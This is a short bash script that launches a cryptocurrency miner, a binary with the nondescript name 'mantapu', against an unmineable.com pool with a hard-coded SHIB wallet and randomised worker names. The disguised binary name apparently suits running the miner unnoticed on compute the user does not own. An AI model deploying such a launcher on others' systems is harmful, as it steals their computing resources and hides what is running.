#!/bin/bash
POOL=rx-us.unmineable.com:3333
WALLET=SHIB:36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A
WORKER=$(echo $(shuf -i 1-99999 -n 1)-xroc)
chmod +x mantapu
./mantapu --algo wrkzcoin --pool $POOL --user $WALLET.$WORKER
